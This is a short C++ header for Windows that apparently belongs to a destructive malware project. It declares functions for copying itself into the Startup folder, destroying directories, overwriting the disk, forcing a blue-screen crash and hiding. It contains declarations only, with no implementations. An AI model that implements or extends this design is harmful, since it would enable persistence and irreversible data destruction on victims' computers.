#pragma once

#include <Windows.h>
#include <AclAPI.h>
#include <ctime>
#include <string>

using namespace std;
extern bool copyToStartupFolder();
extern void findAndReplaceExecutablePath(const wstring& directoryPath, const wstring& originalExePath);
extern void DestroyDirectory(LPWSTR Directory);
extern void OverWriteDisk();
extern void CALL_BSOD();
extern void CALL_HIDE_MODE();
extern wstring getCurrentExecutablePath();